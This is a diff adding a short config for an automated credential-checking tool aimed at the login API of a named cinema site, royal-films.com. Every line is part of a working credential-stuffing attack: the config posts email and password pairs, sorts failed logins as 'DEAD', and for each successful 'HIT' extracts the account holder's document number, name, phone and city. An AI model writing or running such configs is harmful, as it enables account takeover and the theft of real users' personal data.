@@ -1,0 +1,8 @@
+BLOCK=REQUEST-1|TYPE=POST|URL=https://royal-films.com/api/v1/user/login?time=1694487394851|CONTENT={"email": "<EMAIL>","password": "<PASSWORD>"}|HEADERS={"Accept": "application/json, text/plain, */*", "Accept-Language": "es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,ru;q=0.5", "Content-Type": "application/json", "Host": "royal-films.com", "Origin": "https://royal-films.com", "Referer": "https://royal-films.com/login", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Site": "same-origin", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.76"}
+BLOCK=RESULT|VAR=<REQUEST-1.text>|VALUE=success":false|CATEGORY=DEAD
+BLOCK=FIND-DOC|VAR=<REQUEST-1.text>|FIRST=document":"|LAST="
+BLOCK=FIND-FIRST|VAR=<REQUEST-1.text>|FIRST=first_name":"|LAST="
+BLOCK=FIND-LAST|VAR=<REQUEST-1.text>|FIRST=last_name":"|LAST="
+BLOCK=FIND-PHONE|VAR=<REQUEST-1.text>|FIRST=phone":"|LAST="
+BLOCK=FIND-CITY|VAR=<REQUEST-1.text>|FIRST=city":"|LAST="
+BLOCK=RESULT|VAR=<REQUEST-1.text>|VALUE=success":true|CATEGORY=HIT|RETURN=Success! - Document: <FIND-DOC> - FirstName: <FIND-FIRST> - LastName: <FIND-LAST> - Phone: <FIND-PHONE> - City: <FIND-CITY>
